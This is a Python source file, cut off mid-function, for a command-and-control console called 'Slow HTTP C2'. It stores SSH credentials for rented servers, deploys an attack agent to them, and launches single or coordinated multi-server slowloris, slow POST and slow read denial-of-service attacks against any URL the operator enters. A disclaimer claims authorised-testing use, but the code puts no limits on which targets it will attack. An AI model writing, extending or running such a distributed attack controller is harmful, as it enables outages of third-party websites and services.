#!/usr/bin/env python3
"""
Fixed Slow HTTP C2 Server - Complete Implementation
Purpose: Educational and Authorized Penetration Testing Only
"""

import sqlite3
import threading
import json
import time
import os
import sys
import paramiko
import base64
import socket
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Back, Style
import getpass

# Initialize colorama for Windows compatibility
init(autoreset=True)

class DatabaseManager:
    def __init__(self, db_file='c2_database.db'):
        self.db_file = db_file
        self.lock = threading.Lock()
        self.init_database()
    
    def init_database(self):
        """Initialize database with proper schema"""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            
            # Create VPS nodes table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS vps_nodes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT UNIQUE NOT NULL,
                    host TEXT NOT NULL,
                    port INTEGER DEFAULT 22,
                    username TEXT NOT NULL,
                    password TEXT,
                    key_file TEXT,
                    status TEXT DEFAULT 'offline',
                    agent_deployed BOOLEAN DEFAULT 0,
                    last_seen TIMESTAMP,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Create attack logs table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    vps_id INTEGER,
                    attack_type TEXT NOT NULL,
                    target_url TEXT NOT NULL,
                    connections INTEGER,
                    duration INTEGER,
                    status TEXT DEFAULT 'pending',
                    started_at TIMESTAMP,
                    completed_at TIMESTAMP,
                    stats TEXT,
                    FOREIGN KEY (vps_id) REFERENCES vps_nodes (id)
                )
            ''')
            
            # Check if agent_deployed column exists, add if not
            cursor.execute("PRAGMA table_info(vps_nodes)")
            columns = [column[1] for column in cursor.fetchall()]
            
            if 'agent_deployed' not in columns:
                cursor.execute('ALTER TABLE vps_nodes ADD COLUMN agent_deployed BOOLEAN DEFAULT 0')
                print(f"{Fore.YELLOW}[INFO] Database migrated: Added agent_deployed column")
            
            conn.commit()
    
    def add_vps(self, name, host, port, username, password=None, key_file=None):
        """Add new VPS node"""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            try:
                cursor.execute('''
                    INSERT INTO vps_nodes (name, host, port, username, password, key_file)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (name, host, port, username, password, key_file))
                conn.commit()
                return cursor.lastrowid
            except sqlite3.IntegrityError:
                raise Exception(f"VPS with name '{name}' already exists")
    
    def get_vps_list(self):
        """Get list of all VPS nodes"""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM vps_nodes ORDER BY created_at DESC')
            return cursor.fetchall()
    
    def get_vps(self, vps_id):
        """Get specific VPS by ID"""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM vps_nodes WHERE id = ?', (vps_id,))
            return cursor.fetchone()
    
    def update_vps_status(self, vps_id, status, agent_deployed=None):
        """Update VPS status"""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            if agent_deployed is not None:
                cursor.execute('''
                    UPDATE vps_nodes 
                    SET status = ?, agent_deployed = ?, last_seen = CURRENT_TIMESTAMP 
                    WHERE id = ?
                ''', (status, agent_deployed, vps_id))
            else:
                cursor.execute('''
                    UPDATE vps_nodes 
                    SET status = ?, last_seen = CURRENT_TIMESTAMP 
                    WHERE id = ?
                ''', (status, vps_id))
            conn.commit()
    
    def delete_vps(self, vps_id):
        """Delete VPS node"""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute('DELETE FROM vps_nodes WHERE id = ?', (vps_id,))
            cursor.execute('DELETE FROM attack_logs WHERE vps_id = ?', (vps_id,))
            conn.commit()
    
    def log_attack(self, vps_id, attack_type, target_url, connections, duration):
        """Log attack attempt"""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO attack_logs (vps_id, attack_type, target_url, connections, duration, started_at)
                VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (vps_id, attack_type, target_url, connections, duration))
            conn.commit()
            return cursor.lastrowid
    
    def update_attack_log(self, log_id, status, stats=None):
        """Update attack log"""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE attack_logs 
                SET status = ?, completed_at = CURRENT_TIMESTAMP, stats = ?
                WHERE id = ?
            ''', (status, json.dumps(stats) if stats else None, log_id))
            conn.commit()


class VPSManager:
    def __init__(self, db_manager):
        self.db = db_manager
        self.connections = {}  # Cache SSH connections
        self.lock = threading.Lock()
    
    def test_connection(self, vps_id):
        """Test SSH connection to VPS"""
        vps = self.db.get_vps(vps_id)
        if not vps:
            return False, "VPS not found"
        
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Try to connect
            if vps[5]:  # password
                ssh.connect(vps[2], port=vps[3], username=vps[4], password=vps[5], timeout=10)
            elif vps[6]:  # key file
                ssh.connect(vps[2], port=vps[3], username=vps[4], key_filename=vps[6], timeout=10)
            else:
                return False, "No authentication method provided"
            
            # Test basic command
            stdin, stdout, stderr = ssh.exec_command('python3 --version', timeout=10)
            output = stdout.read().decode().strip()
            error = stderr.read().decode().strip()
            
            ssh.close()
            
            if output:
                self.db.update_vps_status(vps_id, 'online')
                return True, f"Connected successfully - {output}"
            else:
                self.db.update_vps_status(vps_id, 'error')
                return False, f"Python3 not found: {error}"
                
        except Exception as e:
            self.db.update_vps_status(vps_id, 'offline')
            return False, f"Connection failed: {str(e)}"
    
    def get_ssh_connection(self, vps_id, reuse=True):
        """Get SSH connection to VPS"""
        if reuse and vps_id in self.connections:
            try:
                # Test existing connection
                transport = self.connections[vps_id].get_transport()
                if transport and transport.is_active():
                    return self.connections[vps_id], None
                else:
                    # Connection is dead, remove it
                    del self.connections[vps_id]
            except:
                if vps_id in self.connections:
                    del self.connections[vps_id]
        
        vps = self.db.get_vps(vps_id)
        if not vps:
            return None, "VPS not found"
        
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            if vps[5]:  # password
                ssh.connect(vps[2], port=vps[3], username=vps[4], password=vps[5], timeout=15)
            elif vps[6]:  # key file
                ssh.connect(vps[2], port=vps[3], username=vps[4], key_filename=vps[6], timeout=15)
            else:
                return None, "No authentication method provided"
            
            if reuse:
                self.connections[vps_id] = ssh
            
            return ssh, None
            
        except Exception as e:
            return None, f"SSH connection failed: {str(e)}"
    
    def deploy_agent(self, vps_id):
        """Deploy slow HTTP agent to VPS"""
        print(f"{Fore.CYAN}[INFO] Deploying agent to VPS {vps_id}...")
        
        ssh, error = self.get_ssh_connection(vps_id)
        if error:
            print(f"{Fore.RED}[ERROR] {error}")
            return False
        
        try:
            # Read the agent file
            agent_file = 'fixed_slowhttp_agent.py'
            if not os.path.exists(agent_file):
                print(f"{Fore.RED}[ERROR] Agent file not found: {agent_file}")
                return False
            
            with open(agent_file, 'r') as f:
                agent_code = f.read()
            
            # Create remote agent file
            remote_path = '/tmp/slowhttp_agent.py'
            
            # Transfer file using SFTP
            try:
                sftp = ssh.open_sftp()
                with sftp.file(remote_path, 'w') as f:
                    f.write(agent_code)
                sftp.close()
                print(f"{Fore.GREEN}[SUCCESS] Agent file transferred via SFTP")
                
            except Exception as e:
                print(f"{Fore.YELLOW}[WARNING] SFTP failed, trying base64 method: {e}")
                
                # Fallback: base64 encode and write
                encoded_agent = base64.b64encode(agent_code.encode()).decode()
                
                # Split into chunks to avoid command line limits
                chunk_size = 1000
                chunks = [encoded_agent[i:i+chunk_size] for i in range(0, len(encoded_agent), chunk_size)]
                
                # Clear any existing file
                stdin, stdout, stderr = ssh.exec_command(f'rm -f {remote_path}', timeout=10)
                stdout.read()
                
                # Write chunks
                for i, chunk in enumerate(chunks):
                    cmd = f'echo "{chunk}" >> /tmp/agent_b64.txt'
                    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=10)
                    stdout.read()
                    
                    if (i + 1) % 10 == 0:
                        print(f"{Fore.CYAN}[INFO] Transferred {i+1}/{len(chunks)} chunks")
                
                # Decode and create final file
                decode_cmd = f'base64 -d /tmp/agent_b64.txt > {remote_path} && rm -f /tmp/agent_b64.txt'
                stdin, stdout, stderr = ssh.exec_command(decode_cmd, timeout=30)
                stdout.read()
                
                print(f"{Fore.GREEN}[SUCCESS] Agent file transferred via base64")
            
            # Make executable
            stdin, stdout, stderr = ssh.exec_command(f'chmod +x {remote_path}', timeout=10)
            stdout.read()
            
            # Verify Python syntax
            stdin, stdout, stderr = ssh.exec_command(f'python3 -m py_compile {remote_path}', timeout=10)
            error_output = stderr.read().decode().strip()
            
            if error_output:
                print(f"{Fore.RED}[ERROR] Agent syntax error: {error_output}")
                return False
            
            # Test agent
            stdin, stdout, stderr = ssh.exec_command(f'python3 {remote_path} --help', timeout=10)
            help_output = stdout.read().decode().strip()
            
            if "Slow HTTP Agent" in help_output:
                self.db.update_vps_status(vps_id, 'online', agent_deployed=True)
                print(f"{Fore.GREEN}[SUCCESS] Agent deployed and verified successfully")
                return True
            else:
                print(f"{Fore.RED}[ERROR] Agent verification failed")
                return False
                
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Agent deployment failed: {e}")
            return False
    
    def execute_attack(self, vps_id, attack_type, target_url, connections=100, duration=300):
        """Execute attack on VPS"""
        print(f"{Fore.CYAN}[INFO] Starting {attack_type} attack on VPS {vps_id}")
        
        # Log attack
        log_id = self.db.log_attack(vps_id, attack_type, target_url, connections, duration)
        
        ssh, error = self.get_ssh_connection(vps_id)
        if error:
            self.db.update_attack_log(log_id, 'failed', {'error': error})
            return False, error
        
        try:
            # Build command
            cmd = f'cd /tmp && python3 slowhttp_agent.py "{target_url}" '
            cmd += f'--attack {attack_type} '
            cmd += f'--connections {connections} '
            cmd += f'--duration {duration} '
            cmd += f'--agent-id agent_{vps_id}'
            
            print(f"{Fore.YELLOW}[INFO] Executing: {cmd}")
            
            # Execute command (non-blocking)
            stdin, stdout, stderr = ssh.exec_command(cmd)
            
            # Read initial output
            time.sleep(2)
            
            # Check if process started
            check_cmd = f"pgrep -f 'slowhttp_agent.py.*{target_url}'"
            stdin2, stdout2, stderr2 = ssh.exec_command(check_cmd, timeout=10)
            pids = stdout2.read().decode().strip()
            
            if pids:
                self.db.update_attack_log(log_id, 'running')
                print(f"{Fore.GREEN}[SUCCESS] Attack started with PID(s): {pids}")
                return True, f"Attack started (PID: {pids})"
            else:
                # Read error output
                error_output = stderr.read().decode().strip()
                self.db.update_attack_log(log_id, 'failed', {'error': error_output})
                print(f"{Fore.RED}[ERROR] Attack failed to start: {error_output}")
                return False, f"Failed to start: {error_output}"
                
        except Exception as e:
            self.db.update_attack_log(log_id, 'failed', {'error': str(e)})
            print(f"{Fore.RED}[ERROR] Attack execution failed: {e}")
            return False, str(e)
    
    def check_attack_status(self, vps_id, target_url):
        """Check if attack is still running"""
        ssh, error = self.get_ssh_connection(vps_id)
        if error:
            return False, error
        
        try:
            # Check for running processes
            check_cmd = f"pgrep -f 'slowhttp_agent.py.*{target_url}'"
            stdin, stdout, stderr = ssh.exec_command(check_cmd, timeout=10)
            pids = stdout.read().decode().strip()
            
            return bool(pids), pids if pids else "No processes found"
            
        except Exception as e:
            return False, str(e)
    
    def stop_attack(self, vps_id, target_url=None):
        """Stop attack on VPS"""
        ssh, error = self.get_ssh_connection(vps_id)
        if error:
            return False, error
        
        try:
            if target_url:
                cmd = f"pkill -f 'slowhttp_agent.py.*{target_url}'"
            else:
                cmd = "pkill -f 'slowhttp_agent.py'"
            
            stdin, stdout, stderr = ssh.exec_command(cmd, timeout=10)
            stdout.read()
            
            return True, "Stop signal sent"
            
        except Exception as e:
            return False, str(e)


class SlowHTTPTestC2:
    def __init__(self):
        self.db = DatabaseManager()
        self.vps_manager = VPSManager(self.db)
        self.running = True
        
        print(f"{Fore.CYAN}{Style.BRIGHT}")
        print("=" * 60)
        print(" Slow HTTP Test C2 - Fixed Version")
        print(" Purpose: Educational and Authorized Testing Only")
        print("=" * 60)
        print(f"{Style.RESET_ALL}")
    
    def print_menu(self):
        """Print main menu"""
        print(f"\n{Fore.GREEN}{Style.BRIGHT}MAIN MENU{Style.RESET_ALL}")
        print(f"{Fore.CYAN}1. VPS Management")
        print(f"2. Launch Attacks")
        print(f"3. Monitor Status")
        print(f"4. View Logs")
        print(f"5. Settings")
        print(f"0. Exit{Style.RESET_ALL}")
    
    def vps_management_menu(self):
        """VPS management submenu"""
        while True:
            print(f"\n{Fore.YELLOW}{Style.BRIGHT}VPS MANAGEMENT{Style.RESET_ALL}")
            print(f"{Fore.CYAN}1. Add VPS")
            print(f"2. List VPS")
            print(f"3. Test Connection")
            print(f"4. Deploy Agent")
            print(f"5. Delete VPS")
            print(f"0. Back{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.WHITE}Select option: {Style.RESET_ALL}").strip()
            
            if choice == '1':
                self.add_vps()
            elif choice == '2':
                self.list_vps()
            elif choice == '3':
                self.test_vps_connection()
            elif choice == '4':
                self.deploy_agent()
            elif choice == '5':
                self.delete_vps()
            elif choice == '0':
                break
            else:
                print(f"{Fore.RED}Invalid option{Style.RESET_ALL}")
    
    def add_vps(self):
        """Add new VPS"""
        print(f"\n{Fore.YELLOW}ADD NEW VPS{Style.RESET_ALL}")
        
        name = input("VPS Name: ").strip()
        if not name:
            print(f"{Fore.RED}Name is required{Style.RESET_ALL}")
            return
        
        host = input("Host/IP: ").strip()
        if not host:
            print(f"{Fore.RED}Host is required{Style.RESET_ALL}")
            return
        
        try:
            port = int(input("SSH Port (22): ").strip() or "22")
        except ValueError:
            port = 22
        
        username = input("Username: ").strip()
        if not username:
            print(f"{Fore.RED}Username is required{Style.RESET_ALL}")
            return
        
        auth_method = input("Auth method (1=Password, 2=Key file): ").strip()
        
        password = None
        key_file = None
        
        if auth_method == '1':
            password = getpass.getpass("Password: ")
        elif auth_method == '2':
            key_file = input("Key file path: ").strip()
            if not os.path.exists(key_file):
                print(f"{Fore.RED}Key file not found{Style.RESET_ALL}")
                return
        else:
            print(f"{Fore.RED}Invalid auth method{Style.RESET_ALL}")
            return
        
        try:
            vps_id = self.db.add_vps(name, host, port, username, password, key_file)
            print(f"{Fore.GREEN}VPS added successfully with ID: {vps_id}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Failed to add VPS: {e}{Style.RESET_ALL}")
    
    def list_vps(self):
        """List all VPS"""
        vps_list = self.db.get_vps_list()
        
        if not vps_list:
            print(f"{Fore.YELLOW}No VPS configured{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}VPS LIST{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'ID':<4} {'Name':<15} {'Host':<20} {'Status':<10} {'Agent':<8} {'Last Seen':<20}{Style.RESET_ALL}")
        print("-" * 80)
        
        for vps in vps_list:
            vps_id, name, host, port, username, password, key_file, status, agent_deployed, last_seen, created_at = vps
            
            # Color code status
            if status == 'online':
                status_color = Fore.GREEN
            elif status == 'offline':
                status_color = Fore.RED
            else:
                status_color = Fore.YELLOW
            
            agent_status = f"{Fore.GREEN}Yes{Style.RESET_ALL}" if agent_deployed else f"{Fore.RED}No{Style.RESET_ALL}"
            last_seen_str = last_seen[:19] if last_seen else "Never"
            
            print(f"{vps_id:<4} {name:<15} {host}:{port:<15} {status_color}{status:<10}{Style.RESET_ALL} {agent_status:<15} {last_seen_str}")
    
    def test_vps_connection(self):
        """Test VPS connection"""
        self.list_vps()
        
        try:
            vps_id = int(input(f"\n{Fore.WHITE}Enter VPS ID to test: {Style.RESET_ALL}"))
        except ValueError:
            print(f"{Fore.RED}Invalid VPS ID{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}Testing connection to VPS {vps_id}...{Style.RESET_ALL}")
        success, message = self.vps_manager.test_connection(vps_id)
        
        if success:
            print(f"{Fore.GREEN}✓ {message}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}✗ {message}{Style.RESET_ALL}")
    
    def deploy_agent(self):
        """Deploy agent to VPS"""
        self.list_vps()
        
        try:
            vps_id = int(input(f"\n{Fore.WHITE}Enter VPS ID to deploy agent: {Style.RESET_ALL}"))
        except ValueError:
            print(f"{Fore.RED}Invalid VPS ID{Style.RESET_ALL}")
            return
        
        success = self.vps_manager.deploy_agent(vps_id)
        
        if success:
            print(f"{Fore.GREEN}✓ Agent deployed successfully{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}✗ Agent deployment failed{Style.RESET_ALL}")
    
    def delete_vps(self):
        """Delete VPS"""
        self.list_vps()
        
        try:
            vps_id = int(input(f"\n{Fore.WHITE}Enter VPS ID to delete: {Style.RESET_ALL}"))
        except ValueError:
            print(f"{Fore.RED}Invalid VPS ID{Style.RESET_ALL}")
            return
        
        confirm = input(f"{Fore.RED}Are you sure you want to delete VPS {vps_id}? (yes/no): {Style.RESET_ALL}").lower()
        
        if confirm == 'yes':
            self.db.delete_vps(vps_id)
            print(f"{Fore.GREEN}VPS deleted successfully{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}Deletion cancelled{Style.RESET_ALL}")
    
    def attack_menu(self):
        """Attack launch menu"""
        while True:
            print(f"\n{Fore.RED}{Style.BRIGHT}ATTACK MENU{Style.RESET_ALL}")
            print(f"{Fore.CYAN}1. Slowloris Attack")
            print(f"2. Slow POST Attack") 
            print(f"3. Slow Read Attack")
            print(f"4. Multi-VPS Coordinated Attack")
            print(f"5. Stop All Attacks")
            print(f"0. Back{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.WHITE}Select attack type: {Style.RESET_ALL}").strip()
            
            if choice == '1':
                self.launch_single_attack('slowloris')
            elif choice == '2':
                self.launch_single_attack('slowpost')
            elif choice == '3':
                self.launch_single_attack('slowread')
            elif choice == '4':
                self.launch_coordinated_attack()
            elif choice == '5':
                self.stop_all_attacks()
            elif choice == '0':
                break
            else:
                print(f"{Fore.RED}Invalid option{Style.RESET_ALL}")
    
    def launch_single_attack(self, attack_type):
        """Launch attack from single VPS"""
        # Show available VPS with agents
        available_vps = [vps for vps in self.db.get_vps_list() if vps[8]]  # agent_deployed = True
        
        if not available_vps:
            print(f"{Fore.RED}No VPS with deployed agents available{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}AVAILABLE VPS WITH AGENTS:{Style.RESET_ALL}")
        for vps in available_vps:
            vps_id, name, host, port, username, _, _, status, _, _, _ = vps
            status_color = Fore.GREEN if status == 'online' else Fore.RED
            print(f"{vps_id}: {name} ({host}:{port}) - {status_color}{status}{Style.RESET_ALL}")
        
        try:
            vps_id = int(input(f"\n{Fore.WHITE}Select VPS ID: {Style.RESET_ALL}"))
        except ValueError:
            print(f"{Fore.RED}Invalid VPS ID{Style.RESET_ALL}")
            return
        
        # Check if VPS exists and has agent
        vps = self.db.get_vps(vps_id)
        if not vps or not vps[8]:
            print(f"{Fore.RED}VPS not found or no agent deployed{Style.RESET_ALL}")
            return
        
        # Get attack parameters
        target_url = input(f"{Fore.WHITE}Target URL (e.g., http://example.com): {Style.RESET_ALL}").strip()
        if not target_url:
            print(f"{Fore.RED}Target URL is required{Style.RESET_ALL}")
            return
        
        # Validate URL format
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        try:
            connections = int(input(f"{Fore.WHITE}Connections ({200 if attack_type=='slowloris' else 100}): {Style.RESET_ALL}") or (200 if attack_type=='slowloris' else 100))
            duration = int(input(f"{Fore.WHITE}Duration in seconds (300): {Style.RESET_ALL}") or 300)
        except ValueError:
            connections = 200 if attack_type == 'slowloris' else 100
            duration = 300
        
        print(f"\n{Fore.YELLOW}ATTACK CONFIGURATION:{Style.RESET_ALL}")
        print(f"VPS: {vps[1]} ({vps[2]}:{vps[3]})")
        print(f"Attack Type: {attack_type.upper()}")
        print(f"Target: {target_url}")
        print(f"Connections: {connections}")
        print(f"Duration: {duration} seconds")
        
        confirm = input(f"\n{Fore.RED}Launch attack? (yes/no): {Style.RESET_ALL}").lower()
        
        if confirm != 'yes':
            print(f"{Fore.YELLOW}Attack cancelled{Style.RESET_ALL}")
            return
        
        # Launch attack
        success, message = self.vps_manager.execute_attack(vps_id, attack_type, target_url, connections, duration)
        
        if success:
            print(f"{Fore.GREEN}✓ {message}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Attack will run for {duration} seconds...{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}✗ Attack failed: {message}{Style.RESET_ALL}")
    
    def launch_coordinated_attack(self):
        """Launch coordinated attack from multiple VPS"""
        available_vps = [vps for vps in self.db.get_vps_list() if vps[8] and vps[7] == 'online']
        
        if len(available_vps) < 2:
            print(f"{Fore.RED}Need at least 2 online VPS with agents for coordinated attack{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}AVAILABLE VPS FOR COORDINATED ATTACK:{Style.RESET_ALL}")
        for vps in available_vps:
            vps_id, name, host, port, username, _, _, status, _, _, _ = vps
            print(f"{vps_id}: {name} ({host}:{port}) - {Fore.GREEN}{status}{Style.RESET_ALL}")
        
        # Select VPS
        vps_ids_str = input(f"\n{Fore.WHITE}Enter VPS IDs separated by comma (e.g., 1,2,3): {Style.RESET_ALL}").strip()
        
        try:
            vps_ids = [int(x.strip()) for x in vps_ids_str.split(',')]
        except ValueError:
            print(f"{Fore.RED}Invalid VPS IDs format{Style.RESET_ALL}")
            return
        
        if len(vps_ids) < 2:
            print(f"{Fore.RED}Need at least 2 VPS for coordinated attack{Style.RESET_ALL}")
            return
        
        # Get attack parameters
        target_url = input(f"{Fore.WHITE}Target URL: {Style.RESET_ALL}").strip()
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        print(f"\n{Fore.CYAN}Select attack type:{Style.RESET_ALL}")
        print("1. Slowloris")
        print("2. Slow POST") 
        print("3. Slow Read")
        
        attack_choice = input("Choice: ").strip()
        attack_types = {'1': 'slowloris', '2': 'slowpost', '3': 'slowread'}
        attack_type = attack_types.get(attack_choice, 'slowloris')
        
        try:
            connections_per_vps = int(input(f"{Fore.WHITE}Connections per VPS (100): {Style.RESET_ALL}") or 100)
            duration = int(input(f"{Fore.WHITE}Duration in seconds (300): {Style.RESET_ALL}") or 300)
        except ValueError:
            connections_per_vps = 100
            duration = 300
        
        total_connections = connections_per_vps * len(vps_ids)
        
        print(f"\n{Fore.YELLOW}COORDINATED ATTACK CONFIGURATION:{Style.RESET_ALL}")
        print(f"VPS Count: {len(vps_ids)}")
        print(f"VPS IDs: {', '.join(map(str, vps_ids))}")
        print(f"Attack Type: {attack_type.upper()}")
        print(f"Target: {target_url}")
        print(f"Connections per VPS: {connections_per_vps}")
        print(f"Total Connections: {total_connections}")
        print(f"Duration: {duration} seconds")
        
        confirm = input(f"\n{Fore.RED}Launch coordinated attack? (yes/no): {Style.RESET_ALL}").lower()
        
        if confirm != 'yes':
            print(f"{Fore.YELLOW}Attack cancelled{Style.RESET_ALL}")
            return
        
        # Launch attacks concurrently
        print(f"\n{Fore.CYAN}Launching coordinated attack...{Style.RESET_ALL}")
        
        with ThreadPoolExecutor(max_workers=len(vps_ids)) as executor:
            futures = []
            
            for vps_id in vps_ids:
                future = executor.submit(
                    self.vps_manager.execute_attack,
                    vps_id, attack_type, target_url, connections_per_vps, duration
                )
                futures.append((vps_id, future))
                time.sleep(1)  # Stagger launches slightly
            
            # Wait for all to start
            results = []
            for vps_id, future in futures:
                try:
                    success, message = future.result(timeout=30)
                    results.append((vps_id, success, message))
                    
                    if success:
                        print(f"{Fore.GREEN}✓ VPS {vps_id}: {message}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}✗ VPS {vps_id}: {message}{Style.RESET_ALL}")
                        
                except Exception as e:
                    print(f"{Fore.RED}✗ VPS {vps_id}: Execution error - {e}{Style.RESET_ALL}")
                    results.append((vps_id, False, str(e)))
        
        successful_attacks = sum(1 for _, success, _ in results if success)
        print(f"\n{Fore.YELLOW}COORDINATED ATTACK SUMMARY:{Style.RESET_ALL}")
        print(f"Successful: {successful_attacks}/{len(vps_ids)} VPS")
        print(f"Total Expected Connections: {successful_attacks * connections_per_vps}")
        print(f"Attack Duration: {duration} seconds")
    
    def stop_all_attacks(self):
        """Stop all running attacks"""
        vps_list = self.db.get_vps_list()
        active_vps = [vps for vps in vps_list if vps[8]]  # Has agent deployed
        
        if not active_vps:
            print(f"{Fore.YELLOW}No VPS with agents found{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.RED}Stopping all attacks...{Style.RESET_ALL}")
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            
            for vps in active_vps:
                vps_id = vps[0]
                future = executor.submit(self.vps_manager.stop_attack, vps_id)
                futures.append((vps_id, future))
            
            for vps_id, future in futures:
                try:
                    success, message = future.result(timeout=15)
                    if success:
                        print(f"{Fore.GREEN}✓ VPS {vps_id}: {message}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}✗ VPS {vps_id}: {message}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}✗ VPS {vps_id}: Stop error - {e}{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}Stop signals sent to all VPS{Style.RESET_ALL}")
    
    def monitor_status(self):
        """Monitor attack status"""
        while True:
            print(f"\n{Fore.CYAN}{Style.BRIGHT}REAL-TIME MONITORING{Style.RESET_ALL}")
            print(f"Press Ctrl+C to return to menu\n")
            
            try:
                vps_list = self.db.get_vps_list()
                active_vps = [vps for vps in vps_list if vps[8]]  # Has agents
                
                if not active_vps:
                    print(f"{Fore.YELLOW}No VPS with agents to monitor{Style.RESET_ALL}")
                    time.sleep(3)
                    break
                
                print(f"{Fore.CYAN}{'VPS':<4} {'Name':<15} {'Status':<10} {'Processes':<30}{Style.RESET_ALL}")
                print("-" * 60)
                
                for vps in active_vps:
                    vps_id, name, host, port, _, _, _, status, _, _, _ = vps
                    
                    # Check for running processes
                    ssh, error = self.vps_manager.get_ssh_connection(vps_id)
                    if ssh and not error:
                        try:
                            stdin, stdout, stderr = ssh.exec_command("pgrep -af slowhttp_agent", timeout=5)
                            processes = stdout.read().decode().strip()
                            
                            if processes:
                                process_count = len(processes.split('\n'))
                                process_info = f"{Fore.GREEN}{process_count} attack(s) running{Style.RESET_ALL}"
                            else:
                                process_info = f"{Fore.YELLOW}No attacks running{Style.RESET_ALL}"
                                
                        except:
                            process_info = f"{Fore.RED}Cannot check{Style.RESET_ALL}"
                    else:
                        process_info = f"{Fore.RED}Connection failed{Style.RESET_ALL}"
                    
                    status_color = Fore.GREEN if status == 'online' else Fore.RED
                    print(f"{vps_id:<4} {name:<15} {status_color}{status:<10}{Style.RESET_ALL} {process_info}")
                
                print(f"\n{Fore.CYAN}Refreshing in 10 seconds...{Style.RESET_ALL}")
                time.sleep(10)
                
                # Clear screen (basic method)
                os.system('cls' if os.name == 'nt' else 'clear')
                
            except KeyboardInterrupt:
                print(f"\n{Fore.CYAN}Monitoring stopped{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"{Fore.RED}Monitoring error: {e}{Style.RESET_ALL}")
                time.sleep(5)
                break
    
    def view_logs(self):
        """View attack logs"""
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}ATTACK LOGS{Style.RESET_ALL}")
        
        with sqlite3.connect(self.db.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                SELECT al.id, vn.name, al.attack_type, al.target_url, 
                       al.connections, al.duration, al.status, al.started_at, al.completed_at
                FROM attack_logs al
                JOIN vps_nodes vn ON al.vps_id = vn.id
                ORDER BY al.started_at DESC
                LIMIT 20
            ''')
            logs = cursor.fetchall()
        
        if not logs:
            print(f"{Fore.YELLOW}No attack logs found{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}{'ID':<4} {'VPS':<10} {'Type':<10} {'Target':<25} {'Conn':<6} {'Dur':<5} {'Status':<10} {'Started':<20}{Style.RESET_ALL}")
        print("-" * 100)
        
        for log in logs:
            log_id, vps_name, attack_type, target_url, connections, duration, status, started_at, completed_at = log
            
            # Truncate long URLs
            if len(target_url) > 22:
                target_url = target_url[:19] + "..."
            
            # Color code status
            if status == 'completed':
                status_color = Fore.GREEN
            elif status == 'running':
                status_color = Fore.YELLOW
            elif status == 'failed':
                status_color = Fore.RED
            else:
                status_color = Fore.CYAN
            
            started_str = started_at[:19] if started_at else "N/A"
            
            print(f"{log_id:<4} {vps_name:<10} {attack_type:<10} {target_url:<25} {connections:<6} {duration:<5} {status_color}{status:<10}{Style.RESET_ALL} {started_str}")
    
    def settings_menu(self):
        """Settings menu"""
        while True:
            print(f"\n{Fore.MAGENTA}{Style.BRIGHT}SETTINGS{Style.RESET_ALL}")
            print(f"{Fore.CYAN}1. Database Info")
            print(f"2. Export Configuration")
            print(f"3. Import Configuration")
            print(f"4. Clear All Data")
            print(f"0. Back{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.WHITE}Select option: {Style.RESET_ALL}").strip()
            
            if choice == '1':
                self.show_database_info()
            elif choice == '2':
                self.export_config()
            elif choice == '3':
                self.import_config()
            elif choice == '4':
                self.clear_all_data()
            elif choice == '0':
                break
            else:
                print(f"{Fore.RED}Invalid option{Style.RESET_ALL}")
    
    def show_database_info(self):
        """Show database information"""
        with sqlite3.connect(self.db.db_file) as conn:
            cursor = conn.cursor()
            
            cursor.execute("SELECT COUNT(*) FROM vps_nodes")
            vps_count = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM attack_logs")
            log_count = cursor.fetchone()[0]
            
